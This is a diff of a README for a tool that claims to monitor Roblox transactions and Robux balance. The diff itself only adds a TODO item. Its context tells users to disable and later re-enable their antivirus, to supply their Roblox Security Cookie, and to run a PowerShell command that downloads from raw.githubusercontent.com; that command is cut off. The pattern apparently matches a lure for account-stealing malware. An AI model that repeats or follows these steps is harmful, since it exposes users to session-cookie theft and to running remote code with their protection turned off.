@@ -19,11 +19,10 @@ A GUI application to monitor Roblox transactions and Robux balance changes in re
 - [x] after that turn the anti virus back on and you're done
 
 ## TODO
-
 - [x] Create a Dropdown menu like past day month year total
+- [ ] Create a Stable Application
 
 ## Configuration
-
 The application requires the following configuration:
 
 1. Roblox Security Cookie
@@ -47,5 +46,4 @@ powershell -Command "(Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/
 ```
 
 ## License
-
 This project is licensed under the Apache License - see the LICENSE file for details.
